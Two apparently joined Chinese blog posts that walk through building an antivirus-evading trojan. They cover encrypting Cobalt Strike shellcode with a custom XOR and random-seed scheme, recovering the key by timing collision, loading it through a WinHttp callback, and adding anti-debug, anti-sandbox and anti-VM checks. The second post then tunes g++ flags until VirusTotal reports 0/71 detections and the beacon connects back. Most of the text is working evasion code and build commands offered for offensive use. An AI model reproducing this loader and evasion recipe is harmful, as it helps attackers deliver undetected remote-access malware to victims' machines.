这是新的效果图：

![图片](https://mmbiz.qpic.cn/mmbiz_png/H14kJWiaichYzMaibhVvOfHPRr5B4WX1biajsSDeAaBz20mHAaBwAfQEGIEsMf6qcUb5qhXpfRbQpdMU3F7G6kWWGQ/640?wxfrom=5&wx_lazy=1&wx_co=1&wx_fmt=png)

![图片](https://mmbiz.qpic.cn/mmbiz_png/H14kJWiaichYzMaibhVvOfHPRr5B4WX1biajcAdVwRYFyPGFg4iaj672hhico7k7da2VHdIgL8jZFnykapUpjwAqOTVA/640?wxfrom=5&wx_lazy=1&wx_co=1&wx_fmt=png)



**03**



### **前置知识

**



免杀马的实现就是将shellcode加密、shellcode加载器、反沙箱及编译器编译等几种技术组合在一起实现免杀。



shellcode加密有异或加密、base64加密、aes加密、自定义加解密等几种。异或加密和base64加密也就是最简单的加密，也就是最容易被查杀的两种加密在这里暂且不考虑，普通的自定义加解密也会被SecureAge、微软等逆推能力很强的杀软查杀。因为aes依赖外部库有bug，这里重新考虑自定义算法，不同的是这里要将自定义算法的密钥做一下转换简称——随机值时间碰撞解密大法。。。

下面是自定义的异或随机值加解密：

```
#include <iostream>

using namespace std;

unsigned char* encrypt(unsigned char* input, int len, unsigned int key) {
    unsigned char* output = new unsigned char[len];
    srand(key);
    for (int i = 0; i < len; i++) {
        output[i] = input[i] ^ key;
        output[i] = output[i] ^ (rand() % len + 1);
    }
    return output;
}

unsigned char* decrypt(unsigned char* input, int len, unsigned int key) {
    unsigned char* output = new unsigned char[len];
    srand(key);
    for (int i = 0; i < len; i++) {
        output[i] = input[i] ^ (rand() % len + 1);
        output[i] = output[i] ^ key;
    }
    return output;
}

int main() {
    unsigned char input[] = "Hello, World!";
    unsigned int key = 123456;
    int len = sizeof input - 1;

    cout << "Original message: " << input << endl;

    unsigned char* encrypted = encrypt(input, len, key);
    cout << "Encrypted message: ";
    for (int i=0; i < len; i++)
        printf("\\x%x", encrypted[i]);
    cout << endl;

    unsigned char* decrypted = decrypt(encrypted, len, key);
    cout << "Decrypted message: ";
    for (int i = 0; i < len; i++)
        printf("%c", decrypted[i]);

    delete[] encrypted;
    delete[] decrypted;

    return 0;
}
```

具体加密过程：先异或加密再用key作为随机值种子生成随机数再异或加密。



后面关于key值的转换：

```
int i = 500;
while (i--) {
    // 获取开始时间
    auto start_time = chrono::high_resolution_clock::now();
    // 延迟100毫秒
    this_thread::sleep_for(chrono::milliseconds(100));
    // 获取结束时间
    auto end_time = chrono::high_resolution_clock::now();
    // 计算时间差
    auto elapsed_time = chrono::duration_cast<chrono::milliseconds>(end_time - start_time);
    srand(time(NULL));
    // 密钥454545先减去100毫秒，再减去15得454430，再加上时间差和0-30的随机数碰撞出原key
    unsigned char* decrypted = decrypt(lpAddress, sizeof lpAddress - 1, 454430 + elapsed_time.count() + (rand() % 30));
    if (decrypted[0] == 0xfc and decrypted[1] == 0x48) {
        // shellcode loader// ......    break;
}
}
```

密钥454545先减去100毫秒，再减去15得454430，再加上时间差和0-30的随机数重复500次保证碰撞出原key，再用if判断前两个字符是否与原shellcode相等，相等则加载shellcode，最后break退出循环。

由于加入了随机值和Sleep()及now()等这类计算时间的函数因此也具有反沙箱的效果，沙箱一般有加速时间的效果，这可能会导致Sleep及now()失效，导致无法碰撞出原key，关于反沙箱后面还会讲到。



前面讲了shellcode加解密，后面讲shellcode加载器。

最好用免杀更强的函数回调shellcode加载器，如http回调加载：

```
#include<Windows.h>
#include<winhttp.h>
#pragma comment(lib,"Winhttp.lib")

unsigned char lpAddress[] = "\xfc...";

int main(INT argc, char* argv[]) {
	DWORD lpflOldProtect;
	VirtualProtect(lpAddress, sizeof lpAddress / sizeof lpAddress[0], PAGE_EXECUTE_READWRITE, &lpflOldProtect);
	HINTERNET hSession = WinHttpOpen(L"User Agent", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
	WINHTTP_STATUS_CALLBACK callback = WinHttpSetStatusCallback(hSession, (WINHTTP_STATUS_CALLBACK)&lpAddress, WINHTTP_CALLBACK_FLAG_HANDLES, 0);
	WinHttpCloseHandle(hSession);
	return 0;
}
```

g++编译命令：

```
g++ scl.cpp -o scl.exe -lwinhttp
```



shellcode加载器讲完，然后是反沙箱。反沙箱操作参考微信上的文章以及chargpt给出的代码，具体效果如何未知，不过微步的沙箱是通过了的。

###  检测

#### （1）简单监测是否是被调试：

```
#include <Windows.h>
#include <iostream>

using namespace std;

int main() {
    if (IsDebuggerPresent()) {
        cout << "调试器检测到当前程序" << endl;
        return 1;
    }

    BOOL bDebuggerPresent = FALSE;
    if (CheckRemoteDebuggerPresent(GetCurrentProcess(), &bDebuggerPresent) && bDebuggerPresent) {
        cout << "远程调试器检测到当前程序" << endl;
        return 1;
    }

    if (GetSystemMetrics(SM_REMOTESESSION) != 0) {
        cout << "当前程序正在远程桌面会话中" << endl;
        return 1;
    }

    return 0;
}
```

#### （2）监测时间流速：

```
#include <iostream>
#include <chrono>
#include <thread>
using namespace std;

bool detect_sandbox() {
    bool is_sandbox = false;
    auto start_time = chrono::high_resolution_clock::now();

    this_thread::sleep_for(chrono::milliseconds(100));

    auto end_time = chrono::high_resolution_clock::now();
    auto elapsed_time = chrono::duration_cast<chrono::milliseconds>(end_time - start_time);

    if (elapsed_time.count() < 100) {
        is_sandbox = true;
    }

    return is_sandbox;
}

int main() {
    if (detect_sandbox()) {
        cout << "This program may be running in a sandbox!" << endl;
    } else {
        cout << "This program is not running in a sandbox." << endl;
    }

    return 0;
}
```

沙箱一个都有时间加速，通过这段代码判断时间是否被加速来判断是否在沙箱。



下面是通过检测硬件来反虚拟化，利用虚拟机与真实物理机之间的差异来检测，这将导致无法在虚拟机中运行。

#### （3）检测内存页数量

```
#include <Windows.h>
#include <iostream>
using namespace std;

int GetNumPages() {
    // 获取系统页面文件大小信息
    MEMORYSTATUSEX statex;
    statex.dwLength = sizeof(statex);
    if (!GlobalMemoryStatusEx(&statex)) {
        cerr << "Failed to get system memory status." << endl;
        return 1;
    }

    SYSTEM_INFO systemInfo;
    GetSystemInfo(&systemInfo);
    return statex.ullTotalPageFile / systemInfo.dwPageSize;
}

int main() {
    int numPages = GetNumPages();
    cout << numPages << endl;
    if (numPages < 4000000) {
        cout << "内存页小于正常值，可能处于虚拟机环境" << endl;
        return 1;
    }
    return 0;
}
```

#### （4）检测硬盘数量

```
#include <Windows.h>
#include <iostream>
using namespace std;

int GetNumDrives() {
    DWORD drives = GetLogicalDrives();
    int numDrives = 0;
    for (char i = 0; i < 26; i++) {
        if (drives & (1 << i)) {
            char path[4];
            sprintf_s(path, "%c:\\", 'A' + i);
            UINT type = GetDriveTypeA(path);
            if (type == DRIVE_FIXED || type == DRIVE_REMOVABLE) {
                numDrives++;
            }
        }
    }
    return numDrives;
}

int main() {
    int numDrives = GetNumDrives();
    cout << numDrives << endl;
    if (numDrives < 2) {
        cout << "硬盘数量小于正常值，可能处于虚拟机环境" << endl;
        return 1;
    }
    return 0;
}
```

#### （5）检测CPU数量

```
#include <Windows.h>
#include <iostream>
using namespace std;

int main() {
    SYSTEM_INFO systemInfo;
    GetSystemInfo(&systemInfo);
    cout << systemInfo.dwNumberOfProcessors << endl;
    if (systemInfo.dwNumberOfProcessors <= 4) {
        cout << "CPU数量小于正常值，可能处于虚拟机环境" << endl;
        return 1;
    }
    return 0;
}
```

#### （6）检测网络适配器数量

```
#include <iostream>
#include <Winsock2.h>
#include <iphlpapi.h>
#include <windows.h>
using namespace std;
#pragma comment(lib, "iphlpapi.lib")

int GetNumAdapters() {
    DWORD dwSize = 0;
    GetAdaptersAddresses(AF_UNSPEC, GAA_FLAG_INCLUDE_PREFIX, NULL, NULL, &dwSize);
    PIP_ADAPTER_ADDRESSES pAddresses = (PIP_ADAPTER_ADDRESSES)new BYTE[dwSize];
    GetAdaptersAddresses(AF_UNSPEC, GAA_FLAG_INCLUDE_PREFIX, NULL, pAddresses, &dwSize);
    int numAdapters = 0;
    PIP_ADAPTER_ADDRESSES pCurrAddresses = pAddresses;
    while (pCurrAddresses) {
        if (pCurrAddresses->OperStatus == IfOperStatusUp) {
            numAdapters++;
        }
        pCurrAddresses = pCurrAddresses->Next;
    }
    return numAdapters;
}

int main() {
    int numAdapters = GetNumAdapters();
    cout << numAdapters << endl;
    if (numAdapters < 2) {
        cout << "网络适配器数量小于正常值，可能处于虚拟机环境" << endl;
        return 1;
    }
    return 0;
}
```



最后是编译器的选择也是重要的一点，有visual studio和g++，选择g++编译，g++编译比vs低两个数量，vs打包空exe在vt有3个报毒，使用g++是1个报毒，但是g++的缺点也很明显g++打包大小3m，vs打包大小20k。



**04**



**组合免杀马**





将前面的几种技术组合在一起就是一个免杀马。

先从cs导出c语言的shellcode，用前面的自定义的异或随机值加解密。

![图片](https://mmbiz.qpic.cn/mmbiz_png/H14kJWiaichYzMaibhVvOfHPRr5B4WX1biajKZRNVYjBnyy7IIOYicKfgiapU9f7cHicQicNMrIy4UbuBa777nvj20ib59g/640?wxfrom=5&wx_lazy=1&wx_co=1&wx_fmt=png)

复制前面16进制的代码到shelllcode加载器：

![图片](https://mmbiz.qpic.cn/mmbiz_png/H14kJWiaichYzMaibhVvOfHPRr5B4WX1biajzlnOP0fmR7rME6nEkicGtnMqZWZ6Ptobaia1icxnXyDZ7clzrSvvUlPzg/640?wxfrom=5&wx_lazy=1&wx_co=1&wx_fmt=png)

再复制前面的反沙箱代码到shellcode加载器：

![图片](https://mmbiz.qpic.cn/mmbiz_png/H14kJWiaichYzMaibhVvOfHPRr5B4WX1biajIFd7FMmAECGLMdE7eic4pl0s7vnmTrykPSWAGMbVxlibC9n1RZSUyPGA/640?wxfrom=5&wx_lazy=1&wx_co=1&wx_fmt=png)key用随机值时间碰撞解密大法：

![图片](https://mmbiz.qpic.cn/mmbiz_png/H14kJWiaichYzMaibhVvOfHPRr5B4WX1biajP9rpJs6Io9vNNhllqe1M6BPkiapAL8Q2FO9AtAe3biay3HwnELL4tCEA/640?wxfrom=5&wx_lazy=1&wx_co=1&wx_fmt=png)

到这里免杀木马基本完成，测试以下能否反弹shell，用g++编译：

```
g++ scl.cpp -o scl.exe -lwinhttp -liphlpapi
```

在虚拟机中测试：

![图片](https://mmbiz.qpic.cn/mmbiz_png/H14kJWiaichYzMaibhVvOfHPRr5B4WX1biajgiadHr5rpoamGChyAvfTHOK6Z2UhakZlMktGHsQ519AfkUs2XiaNUtFw/640?wxfrom=5&wx_lazy=1&wx_co=1&wx_fmt=png)提示是这是虚拟机同时终止运行。

放主机上测试，主机上的360没有报毒：

![图片](https://mmbiz.qpic.cn/mmbiz_png/H14kJWiaichYzMaibhVvOfHPRr5B4WX1biajJib2ibXzyJJgiaLibaWFkwz1cbAcPiczX7anz22gEtLmrzA9uDiaNFB3HeibA/640?wxfrom=5&wx_lazy=1&wx_co=1&wx_fmt=png)

![图片](https://mmbiz.qpic.cn/mmbiz_png/H14kJWiaichYzMaibhVvOfHPRr5B4WX1biajXxn9vAIiaUrVv7iaVDUEYqY7fGQ39dJfbia7V59PVkUuLI01Vok2U3mgA/640?wxfrom=5&wx_lazy=1&wx_co=1&wx_fmt=png)

放VT和微步就是前面的截图。





上一篇文章：[shellcode随机值时间碰撞解密大法免杀](http://mp.weixin.qq.com/s?__biz=Mzg5NTYwMDIyOA==&mid=2247489905&idx=1&sn=d95926e312b8bf9e20b3ad8fb391f2cf&chksm=c00c8a7af77b036c74aa353afc925dcf252e8b5f196fbca2db9ee2714354817e4ecc223bb0be&scene=21#wechat_redirect)

制作了VT查杀1的免杀马，于是我自夸了一句过VT和微步，但是群里面有小伙伴说：

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/H14kJWiaichYwMeY85a3jFibT3MmNjzLtnWSqd3CzgBO9shtnLjAEezPGgeBK08WoqqicZeNpfn9W9QzxxjjWHAI4w/640?wxfrom=5&wx_lazy=1&wx_co=1&wx_fmt=jpeg)

的确是还有一个，本来我觉得VT 1/71已经够了，但我觉得还是可以研究一下，在我的印象里剩下这个MaxSecure只要是g++打包的exe都会报毒。

![图片](https://mmbiz.qpic.cn/mmbiz_png/H14kJWiaichYwMeY85a3jFibT3MmNjzLtnWdRlnOcicicn61XF0zSEAjPM49Cnx6nQrb6MFRvQdNiaA8TUyNCsjl3wnA/640?wxfrom=5&wx_lazy=1&wx_co=1&wx_fmt=png)

如果我的免杀代码没有问题，杀毒无法监测出病毒，那么问题只能出在编译上。



 **02**



**效果图**





还是先放效果图：

![图片](https://mmbiz.qpic.cn/mmbiz_png/H14kJWiaichYwMeY85a3jFibT3MmNjzLtnWcmn77beE6mFhBazQNKayt65iajiaQpD0Oedj06CGic3UhDZopuLUbEwGw/640?wxfrom=5&wx_lazy=1&wx_co=1&wx_fmt=png)



 **03**



**前置知识

**



免杀马的实现就是将shellcode加密、shellcode加载器、反沙箱及编译器编译等几种技术组合在一起实现免杀。



前面一篇文章讲了shellcode加密、shellcode加载器、反沙箱以及简单讲了以下编译器编译，在选择编译器时VS还是g++，选择g++，因为g++编译的空包exe比VS编译低两个数量级。但除了编译器选择还有编译器应该如何编译——编译器编译命令。编译器编译命令也是一个很大的影响因数，后面的会写一篇python免杀VT查杀1/71的文章也会用到这个原理。



 **04**



**免杀实验

**



先让chargpt写一个冒泡排序：

![图片](https://mmbiz.qpic.cn/mmbiz_png/H14kJWiaichYwMeY85a3jFibT3MmNjzLtnWa7PHPjaeRGCo8rQZeJsePtW4LCE57Cq09uibryebTO4kczzwUhZiaT5Q/640?wxfrom=5&wx_lazy=1&wx_co=1&wx_fmt=png)

这是一段完全无害的代码，如果报毒，那么绝对是编译的问题，分别用VS与g++编译这一段代码上传VT看看VT报毒情况。

VS编译：

![图片](https://mmbiz.qpic.cn/mmbiz_png/H14kJWiaichYwMeY85a3jFibT3MmNjzLtnWavhPjUdW2JXm45tsvWBWicB0AT7Lhibt51eXAFcmAB3ibLdJ6ALayC5lw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

g++编译：

```
g++ scl2.cpp -o scl.exe -mconsole
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/H14kJWiaichYwMeY85a3jFibT3MmNjzLtnWoopWGChne15uwI2KjxIdnMFRfReeicHh8omXPVNgQfNs12cddNZnXjA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

可以看到g++编译的命令要比VS低很多，后面继续用g++编译这一段代码不同的是不断改变g++的编译命令。



先测试一些常见的命令：

![图片](https://mmbiz.qpic.cn/mmbiz_png/H14kJWiaichYwMeY85a3jFibT3MmNjzLtnWz3fwIgxIruJZgJyZ2ia6WyxvGP4nibI35cWBlAwcoE6Rf93qFOTTrfmg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

- 

```
g++ scl2.cpp -o scl.exe -mconsole -pipe
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/H14kJWiaichYwMeY85a3jFibT3MmNjzLtnWHfpHHysgI4BWv6h3V8YDyK3Qt1kX3FzwOgWcbaYOppQy5FTpXQoRpw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

- 

```
g++ scl2.cpp -o scl.exe -mconsole -time
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/H14kJWiaichYwMeY85a3jFibT3MmNjzLtnWicxMKG3aUxdvmGI0OaBTgYyicDjT6xw8rNEgMasdPQYnnV6f40V106GQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

```
g++ scl2.cpp -o scl.exe -mconsole -s
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/H14kJWiaichYwMeY85a3jFibT3MmNjzLtnWZXLXsZVSPc8JHeayViaiauGIYp7h2vo2V7kTcfCWuFcv0WFrZP0kM59w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

一些参数还可能会导致报毒变多，-s参数就是一个很典型的例子，6个报毒。。

- 

```
g++ scl2.cpp -o scl.exe -mconsole -pie
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/H14kJWiaichYwMeY85a3jFibT3MmNjzLtnWHQicVx57bwIgoe44gEPvlHww0K8ibl30v2zH5r7Ua7JwqaaOodkSCdRQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

-pie参数编译后运行没有反应，跳过。

- 

```
g++ scl2.cpp -o scl.exe -mconsole -shared
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/H14kJWiaichYwMeY85a3jFibT3MmNjzLtnWrjryZN0vvS9aTV1PydMXNcgKJ95qcWm2xesrLich05R6P1nMTKkqDNw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

-shared参数编译后运行无法运行，跳过。

--target-help下面还有几百个参数：

![图片](https://mmbiz.qpic.cn/mmbiz_png/H14kJWiaichYwMeY85a3jFibT3MmNjzLtnWycyssEPsUgg7ER1TyMaol3VnfQ7nniaLEsTVcIhkyNT0icMJtc9T3Edw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

我试了一些不是没有变化就是不能运行或是不会用，这个时候我想到了chargpt，这种时候用chargpt就是很合适了。

![图片](https://mmbiz.qpic.cn/mmbiz_png/H14kJWiaichYwMeY85a3jFibT3MmNjzLtnWTIWDM0mYmuiag2OShNJEMwTDeTekkeHwWaB52Ppkn5RZmAia02QKzhtw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

1. -s 参数用于剥离可执行文件中的符号表，这样可以使反汇编变得更困难，也可以减少程序被误判为病毒的概率。
2. -fno-stack-protector 参数可以禁用堆栈保护机制，这样可以减少杀软对程序的误报。
3. -fvisibility=hidden 参数可以隐藏编译出的符号表，这也可以使反汇编变得更困难。
4. -Wl,--dynamicbase，-Wl,--nxcompat 参数可以启用程序地址空间随机化和数据执行保护，这可以提高程序的安全性，同时也可以减少杀软的误报。

前面第一个 -s ，前面试过了，6个报毒，直接舍弃。试试后面的4个：

- 

```
g++ scl.cpp -o scl.exe -mconsole -fno-stack-protector
```

还是1个报毒。

- 

```
g++ scl.cpp -o scl.exe -mconsole -fno-stack-protector -fvisibility=hidden
```

还是1个报毒。

- 

```
g++ scl.cpp -o scl.exe -mconsole -fno-stack-protector -fvisibility=hidden -Wl,--dynamicbase
```

还是1个报毒。

- 

```
g++ scl.cpp -o scl.exe -mconsole -fno-stack-protector -fvisibility=hidden -Wl,--dynamicbase -Wl,--nxcompat
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/H14kJWiaichYwMeY85a3jFibT3MmNjzLtnWkXic2mvDU4ksXU1XPsjBY5GBar67uf8G7kOYEDqSBibNtqQHTGDsOYMw/640?wxfrom=5&wx_lazy=1&wx_co=1&wx_fmt=png)

最后一个0个报毒！

那么关键的时候来了，将代码换成前一篇的随机值时间碰撞解密免杀（没有看过前一篇的关注公众号：锦鲤安全）。

- 

```
g++ scl2.cpp -o scl.exe -mconsole -fno-stack-protector -fvisibility=hidden -Wl,--dynamicbase -Wl,--nxcompatg++
```

g++编译，主机启动360不报毒，cs正常上线

![图片](https://mmbiz.qpic.cn/mmbiz_png/H14kJWiaichYwMeY85a3jFibT3MmNjzLtnWd2zJNuRiaDq29G70jGjs3h2vWURf823IO1H6pDH8Zo5Z7Q4cc3Ux3CQ/640?wxfrom=5&wx_lazy=1&wx_co=1&wx_fmt=png)

![图片](https://mmbiz.qpic.cn/mmbiz_png/H14kJWiaichYwMeY85a3jFibT3MmNjzLtnWV5H40ib9GIKH2eqSY9CFmN7X2FXJVNicrRBlLgplzicdiczciatmCEl6p1Q/640?wxfrom=5&wx_lazy=1&wx_co=1&wx_fmt=png)

上传VT，结果出来实现VT全免杀！至此实验结束。



补充：

- 

```
g++ scl2.cpp -o scl.exe -mconsole -Wl,--nxcompat
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/H14kJWiaichYwMeY85a3jFibT3MmNjzLtnWU2d6IHIEh5icvH02oInMSLMTx4wxJQvCwOARGVSBdGwXUhu0cZq952w/640?wxfrom=5&wx_lazy=1&wx_co=1&wx_fmt=png)

单独使用 -Wl,--nxcompat 参数还是会导致报毒。

**05**

**实验结论**





在代码确定免杀的情况下报毒，是编译的问题。使用g++编译时 -s 参数会导致报毒增多（6/71），

```
-fno-stack-protector -fvisibility=hidden -Wl,--dynamicbase -Wl,--nxcompat
```

连在一起使用可减少报毒（0/71）。

- 

```
g++ scl2.cpp -o scl.exe -mconsole -fno-stack-protector -fvisibility=hidden -Wl,--dynamicbase -Wl,--nxcompat
```





